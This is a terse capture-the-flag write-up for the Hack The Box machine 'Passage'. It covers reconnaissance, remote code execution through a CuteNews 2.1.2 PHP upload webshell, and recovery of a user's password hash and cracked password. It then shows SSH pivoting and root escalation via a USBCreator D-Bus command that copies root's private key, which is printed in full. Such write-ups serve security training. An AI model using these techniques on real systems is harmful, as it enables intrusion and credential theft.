# Passage

IP `10.10.10.206` `passage.htb`

## Open ports
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 17:eb:9e:23:ea:23:b6:b1:bc:c6:4f:db:98:d3:d4:a1 (RSA)
|   256 71:64:51:50:c3:7f:18:47:03:98:3e:5e:b8:10:19:fc (ECDSA)
|_  256 fd:56:2a:f8:d0:60:a7:f1:a0:a1:47:a4:38:d6:a8:a1 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Passage News
```

## People names
```
James
admin
Sid Meier
Kim Swift
Paul Coles - admin
```

## Mails
```
nadav@passage.htb - admin
kim@passage.htb
sid@passage.htb
james@passage.htb
```

## RCE
```
http://passage.htb/CuteNews/

gives us a login/register page


that page reveals the cutenews version 2.1.2

doing a quick google search we can see that there is rce 
https://medium.com/@musyokaian/cutenews-2-1-2-remote-code-execution-vulnerability-450f29673194

after uploading php file

we can visit it at http://passage.htb/CuteNews/uploads/avatar_ozzo_cmd.php?cmd=whoami

and we got rce!

and then

python3 -c 'import pty; pty.spawn("/bin/sh")'
```

## Users in machine(/home)
```
paul
nadav
```

## getting user(paul)
```
looking in /var/www/html/CuteNews/cdata/users/b0.php

we get base64 encoded info

YToxOntzOjQ6Im5hbWUiO2E6MTp7czoxMDoicGF1bC1jb2xlcyI7YTo5OntzOjI6ImlkIjtzOjEwOiIxNTkyNDgzMjM2IjtzOjQ6Im5hbWUiO3M6MTA6InBhdWwtY29sZXMiO3M6MzoiYWNsIjtzOjE6IjIiO3M6NToiZW1haWwiO3M6MTY6InBhdWxAcGFzc2FnZS5odGIiO3M6NDoibmljayI7czoxMDoiUGF1bCBDb2xlcyI7czo0OiJwYXNzIjtzOjY0OiJlMjZmM2U4NmQxZjgxMDgxMjA3MjNlYmU2OTBlNWQzZDYxNjI4ZjQxMzAwNzZlYzZjYjQzZjE2ZjQ5NzI3M2NkIjtzOjM6Imx0cyI7czoxMDoiMTU5MjQ4NTU1NiI7czozOiJiYW4iO3M6MToiMCI7czozOiJjbnQiO3M6MToiMi

after decoding it we get 

a:1:{s:4:"name";a:1:{s:10:"paul-coles";a:9:{s:2:"id";s:10:"1592483236";s:4:"name";s:10:"paul-coles";s:3:"acl";s:1:"2";s:5:"email";s:16:"paul@passage.htb";s:4:"nick";s:10:"Paul Coles";s:4:"pass";s:64:"e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd";s:3:"lts";s:10:"1592485556";s:3:"ban";s:1:"0";s:3:"cnt";s:1:"2";}}}

we can see that we have paul hash(sha-256)

we can also do: cat * | base64 -d | grep pass

using crackstation we get the password

e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd

paul:atlanta1
```

## getting user(nadav)
```
/home/paul/.ssh/authorized_keys
we find that we can ssh into nadav@localhost from inside as paul
```

## Getting root
```
doing ps aux we can see dbus

doing a quick google search for dbus priv esc

https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/
https://www.exploit-db.com/exploits/36820

gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/.ssh/id_rsa /tmp/id_rsa true

cat /tmp/id_rsa

-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAth1mFSVw6Erdhv7qc+Z5KWQMPtwTsT9630uzpq5fBx/KKzqZ
B7G3ej77MN35+ULlwMcpoumayWK4yZ/AiJBm6FEVBGSwjSMpOGcNXTL1TClGWbdE
+WNBT+30n0XJzi/JPhpoWhXM4OqYLCysX+/b0psF0jYLWy0MjqCjCl/muQtD6f2e
jc2JY1KMMIppoq5DwB/jJxq1+eooLMWVAo9MDNDmxDiw+uWRUe8nj9qFK2LRKfG6
U6wnyQ10ANXIdRIY0bzzhQYTMyH7o5/sjddrRGMDZFmOq6wHYN5sUU+sZDYD18Yg
ezdTw/BBiDMEPzZuCUlW57U+eX3uY+/Iffl+AwIDAQABAoIBACFJkF4vIMsk3AcP
0zTqHJ1nLyHSQjs0ujXUdXrzBmWb9u0d4djZMAtFNc7B1C4ufyZUgRTJFETZKaOY
8q1Dj7vJDklmSisSETfBBl1RsiqApN5DNHVNIiQE/6CZNgDdFTCnzQkiUPePic8R
P1St2AVP1qmMvVimDFSJoiOEUfzidepXEEUQrByNmOJDtewMSm4aGz60ced2XCBr
GTt/wyo0y5ygRJkUcC+/o4/r2DQdrjCbeuyzAzzhFKQQx6HN5svzpi0jOWC0cB0W
GmAp5Q7fIFhuGyrxShs/BEuQP7q7Uti68iwEh2EZSlaMcBFEJvirWtIO7U3yIHYI
HnNlLvECgYEA7tpebu84sTuCarHwASAhstiCR5LMquX/tZtHi52qKKmYzG6wCCMg
S/go8DO8AX5mldkegD7KBmTeMNPKp8zuE8s+vpErCBH+4hOq6U1TwZvDQ2XY9HBz
aHz7vG5L8E7tYpJ64Tt8e0DcnQQtW8EqFIydipO0eLdxkIGykjWuYGsCgYEAwzBM
UZMmOcWvUULWf65VSoXE270AWP9Z/XuamG/hNpREDZEYvHmhucZBf1MSGGU/B7MC
YXbIs1sS6ehDcib8aCVdOqRIqhCqCd1xVnbE0T4F2s1yZkct09Bki6EuXPDo2vhy
/6v6oP+yT5z854Vfq0FWxmDUssMbjXkVLKIZ3skCgYAYvxsllzdidW3vq/vXwgJ7
yx7EV5tI4Yd6w1nIR0+H4vpnw9gNH8aK2G01ZcbGyNfMErCsTNUVkIHMwUSv2fWY
q2gWymeQ8Hxd4/fDMDXLS14Rr42o1bW/T6OtRCgt/59spQyCJW2iP3gb9IDWjs7T
TjZMUz1RfIARnr5nk5Q7fQKBgGESVxJGvT8EGoGuXODZAZ/zUQj7QP4B2G5hF2xy
T64GJKYeoA+z6gNrHs3EsX4idCtPEoMIQR45z/k2Qry1uNfOpUPxyhWR/g6z65bV
sGJjlyPPAvLsuVTbEfYDLfyY7yVfZEnU7Os+3x4K9BfsU7zm3NIB/CX/NGeybR5q
a7VJAoGANui4oMa/9x8FSoe6EPsqbUcbJCmSGPqS8i/WZpaSzn6nW+636uCgB+EP
WOtSvOSRRbx69j+w0s097249fX6eYyIJy+L1LevF092ExQdoc19JTTKJZiWwlk3j
MkLnfTuKj2nvqQQ2fq+tIYEhY6dcSRLDQkYMCg817zynfP0I69c=
-----END RSA PRIVATE KEY-----

and then using that key to ssh in as root!
```
